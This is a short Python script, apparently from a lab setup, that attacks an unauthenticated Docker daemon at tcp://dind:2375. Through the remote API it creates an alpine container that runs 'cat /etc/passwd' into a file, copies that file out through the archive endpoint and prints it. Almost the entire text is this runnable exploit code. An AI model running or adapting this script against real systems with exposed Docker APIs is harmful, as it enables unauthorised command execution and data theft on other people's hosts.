import os, time, requests, json

DOCKER_HOST = os.getenv('DOCKER_HOST', 'tcp://dind:2375')
BASE_URL = DOCKER_HOST.rstrip('/')

def wait_for_dind(retries=30, delay=2):
    for _ in range(retries):
        try:
            r = requests.get(f'{BASE_URL}/_ping', timeout=2)
            if r.status_code == 200:
                return True
        except Exception:
            pass
        time.sleep(delay)
    return False

def exploit():
    if not wait_for_dind():
        print('Docker daemon in dind not reachable, exiting')
        return
    url = f'{BASE_URL}/containers/create'
    payload = {
        'Image': 'alpine',
        'Cmd': ['sh', '-c', 'cat /etc/passwd > /tmp/exfiltrate']
    }
    r = requests.post(url, json=payload)
    if r.status_code == 201:
        container_id = r.json()['Id']
        start_url = f'{BASE_URL}/containers/{container_id}/start'
        requests.post(start_url)
        time.sleep(2)
        cp_url = f'{BASE_URL}/containers/{container_id}/archive?path=/tmp/exfiltrate'
        resp = requests.get(cp_url)
        if resp.status_code == 200:
            print('Exploit succeeded, data received:')
            print(resp.content)
        else:
            print('Failed to copy file')
    else:
        print('Failed to create container')

if __name__ == '__main__':
    exploit()
    while True:
        time.sleep(60)
